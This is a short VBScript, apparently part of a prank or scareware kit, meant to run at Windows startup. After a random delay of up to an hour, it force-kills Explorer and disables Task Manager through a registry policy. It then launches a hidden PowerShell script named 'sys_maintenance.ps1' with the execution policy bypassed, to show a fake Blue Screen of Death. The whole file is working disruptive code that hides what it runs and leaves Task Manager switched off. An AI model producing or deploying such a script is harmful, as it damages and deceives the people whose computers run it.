'This VBScript runs at startup. It waits a random interval (between 1 and 60 minutes), 
'terminates Explorer and disables Task Manager, and then launches the fake BSOD PowerShell script.

' Create WScript Shell objects for executing system commands
Dim objShell, WshShell, delay
Set objShell = CreateObject("WScript.Shell")
Set WshShell = CreateObject("WScript.Shell")

' Seed the random number generator and calculate a random delay (1-60 minutes)
Randomize
delay = Int((Rnd * 60) + 1) * 60000  ' Delay in milliseconds

' Pause execution for the random delay period
WScript.Sleep delay

' Terminate Explorer to simulate system instability and disable Task Manager for realism
objShell.Run "taskkill /F /IM explorer.exe", 0, True
objShell.Run "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", 0, True

' Launch the PowerShell script (sys_maintenance.ps1) to display the fake BSOD
objShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File %USERPROFILE%\sys_maintenance.ps1", 0, True

' Clean up shell objects
Set objShell = Nothing
Set WshShell = Nothing
